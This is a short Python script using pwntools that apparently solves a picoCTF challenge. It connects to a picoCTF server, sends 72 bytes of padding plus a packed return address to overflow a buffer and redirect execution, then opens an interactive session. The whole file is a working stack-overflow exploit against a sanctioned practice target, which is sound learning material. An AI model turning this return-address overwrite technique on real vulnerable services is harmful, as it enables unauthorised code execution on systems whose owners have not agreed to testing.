from pwn import *

#r = process('./vuln')

r = remote('saturn.picoctf.net', 50700)


payload = b'a' * 72
payload += p64(0x0040123b)

r.send(payload)
r.interactive()
